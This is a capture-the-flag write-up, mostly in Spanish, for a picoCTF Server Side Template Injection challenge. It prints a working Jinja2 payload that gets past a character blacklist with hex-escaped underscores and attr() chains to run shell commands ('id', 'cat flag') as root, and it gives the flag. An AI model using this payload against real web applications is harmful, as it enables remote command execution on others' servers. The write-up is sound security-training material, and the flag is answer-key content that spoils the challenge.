### Descripción
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:55567/)!

Hints:
1. Server Side Template Injection
2. Why is blacklisting characters a bad idea to sanitize input?

### Solución
Entramos a la página.
En https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/ encontramos el siguiente script: 
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

Al introducirlo en la página nos muestra: 
```
uid=0(root) gid=0(root) groups=0(root)
```

Cambiamos el script en el id para poner cat flag:
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```

Lo introducimos denuevo y nos muestra la bandera:
```
picoCTF{sst1_f1lt3r_byp4ss_5b0b2f79}
```

Flag:
picoCTF{sst1_f1lt3r_byp4ss_5b0b2f79}
### Notas adicionales

### Referencias
https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/ 